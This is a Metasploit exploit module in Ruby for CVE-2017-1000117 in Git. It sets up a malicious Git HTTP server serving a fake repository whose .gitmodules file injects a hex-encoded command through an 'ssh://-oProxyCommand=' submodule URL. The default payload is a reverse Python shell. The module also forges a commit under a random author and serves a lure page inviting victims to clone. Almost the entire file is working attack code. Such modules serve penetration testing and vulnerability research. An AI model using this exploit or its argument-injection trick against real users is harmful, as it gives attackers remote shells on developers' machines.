# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpServer
 
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;Malicious Git HTTP Server For CVE-2017-1000117&#039;,
        &#039;Description&#039; => %q(
                  This module exploits CVE-2017-1000117, which affects Git
          version 2.7.5 and lower. A submodule of the form &#039;ssh://&#039; can be passed
          parameters from the username incorrectly. This can be used to inject
          commands to the operating system when the submodule is cloned.
 
          This module creates a fake git repository which contains a submodule
          containing the vulnerability. The vulnerability is triggered when the
          submodules are initialised.
        ),
        &#039;License&#039; => MSF_LICENSE,
        &#039;References&#039;     =>
          [
            [&#039;CVE&#039;, &#039;2017-1000117&#039;],
            [&#039;URL&#039;, &#039;http://seclists.org/oss-sec/2017/q3/280&#039; ]
          ],
        &#039;DisclosureDate&#039; => &#039;Aug 10 2017&#039;,
        &#039;Targets&#039; =>
          [
            [
              &#039;Automatic&#039;,
              {
                &#039;Platform&#039; => [ &#039;unix&#039; ],
                &#039;Arch&#039; => ARCH_CMD,
                &#039;Payload&#039; =>
                  {
                    &#039;Compat&#039; =>
                      {
                        &#039;PayloadType&#039; => &#039;python&#039;
                      }
                  }
              }
            ]
          ],
        &#039;DefaultOptions&#039; =>
          {
            &#039;Payload&#039; => &#039;cmd/unix/reverse_python&#039;
          },
        &#039;DefaultTarget&#039;  => 0
      )
    )
 
    register_options(
      [
        OptString.new(&#039;GIT_URI&#039;, [false, &#039;The URI to use as the malicious Git instance (empty for random)&#039;, &#039;&#039;]),
        OptString.new(&#039;GIT_SUBMODULE&#039;, [false, &#039;The path to use as the malicious git submodule (empty for random)&#039;, &#039;&#039;])
      ]
    )
  end
 
  def setup
    @repo_data = {
      git: { files: {} }
    }
    setup_git
    super
  end
 
  def setup_git
    # URI must start with a /
    unless git_uri && git_uri =~ /^\//
      fail_with(Failure::BadConfig, &#039;GIT_URI must start with a /&#039;)
    end
 
    payload_cmd = payload.encoded + " &"
    payload_cmd = Rex::Text.to_hex(payload_cmd, &#039;%&#039;)
 
    submodule_path = datastore[&#039;GIT_SUBMODULE&#039;]
    if submodule_path.blank?
      submodule_path = Rex::Text.rand_text_alpha(rand(8) + 2).downcase
    end
 
    gitmodules = "[submodule \"#{submodule_path}\"]
path = #{submodule_path}
url = ssh://-oProxyCommand=#{payload_cmd}/
"
    sha1, content = build_object(&#039;blob&#039;, gitmodules)
    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
 
    tree = "100644 .gitmodules\0#{[sha1].pack(&#039;H*&#039;)}"
    tree += "160000 #{submodule_path}\0#{[sha1].pack(&#039;H*&#039;)}"
    sha1, content = build_object(&#039;tree&#039;, tree)
    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
 
    ## build the supposed commit that dropped this file, which has a random user/company
    email = Rex::Text.rand_mail_address
    first, last, company = email.scan(/([^\.]+)\.([^\.]+)@(.*)$/).flatten
    full_name = "#{first.capitalize} #{last.capitalize}"
    tstamp = Time.now.to_i
    author_time = rand(tstamp)
    commit_time = rand(author_time)
    tz_off = rand(10)
    commit = "author #{full_name} <#{email}> #{author_time} -0#{tz_off}00\n" \
             "committer #{full_name} <#{email}> #{commit_time} -0#{tz_off}00\n" \
             "\n" \
             "Initial commit to open git repository for #{company}!\n"
 
    sha1, content = build_object(&#039;commit&#039;, "tree #{sha1}\n#{commit}")
    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
    @repo_data[:git][:files][&#039;/HEAD&#039;] = "ref: refs/heads/master\n"
    @repo_data[:git][:files][&#039;/info/refs&#039;] = "#{sha1}\trefs/heads/master\n"
  end
 
  # Build&#039;s a Git object
  def build_object(type, content)
    # taken from http://schacon.github.io/gitbook/7_how_git_stores_objects.html
    header = "#{type} #{content.size}\0"
    store = header + content
    [Digest::SHA1.hexdigest(store), Zlib::Deflate.deflate(store)]
  end
 
  # Returns the Git object path name that a file with the provided SHA1 will reside in
  def get_path(sha1)
    sha1[0...2] + &#039;/&#039; + sha1[2..40]
  end
 
  def exploit
    super
  end
 
  def primer
    # add the git and mercurial URIs as necessary
    hardcoded_uripath(git_uri)
    print_status("Malicious Git URI is #{URI.parse(get_uri).merge(git_uri)}")
  end
 
  # handles routing any request to the mock git, mercurial or simple HTML as necessary
  def on_request_uri(cli, req)
    # if the URI is one of our repositories and the user-agent is that of git/mercurial
    # send back the appropriate data, otherwise just show the HTML version
    user_agent = req.headers[&#039;User-Agent&#039;]
    if user_agent && user_agent =~ /^git\// && req.uri.start_with?(git_uri)
      do_git(cli, req)
      return
    end
 
    do_html(cli, req)
  end
 
  # simulates a Git HTTP server
  def do_git(cli, req)
    # determine if the requested file is something we know how to serve from our
    # fake repository and send it if so
    req_file = URI.parse(req.uri).path.gsub(/^#{git_uri}/, &#039;&#039;)
    if @repo_data[:git][:files].key?(req_file)
      vprint_status("Sending Git #{req_file}")
      send_response(cli, @repo_data[:git][:files][req_file])
    else
      vprint_status("Git #{req_file} doesn&#039;t exist")
      send_not_found(cli)
    end
  end
 
  # simulates an HTTP server with simple HTML content that lists the fake
  # repositories available for cloning
  def do_html(cli, _req)
    resp = create_response
    resp.body = <<HTML
     <html>
      <head><title>Public Repositories</title></head>
      <body>
        <p>Here are our public repositories:</p>
        <ul>
HTML
    this_git_uri = URI.parse(get_uri).merge(git_uri)
    resp.body << "<li><a href=#{git_uri}>Git</a> (clone with `git clone #{this_git_uri}`)</li>"
    resp.body << <<HTML
        </ul>
      </body>
    </html>
HTML
 
    cli.send_response(resp)
  end
 
  # Returns the value of GIT_URI if not blank, otherwise returns a random .git URI
  def git_uri
    return @git_uri if @git_uri
    if datastore[&#039;GIT_URI&#039;].blank?
      @git_uri = &#039;/&#039; + Rex::Text.rand_text_alpha(rand(10) + 2).downcase + &#039;.git&#039;
    else
      @git_uri = datastore[&#039;GIT_URI&#039;]
    end
  end
end

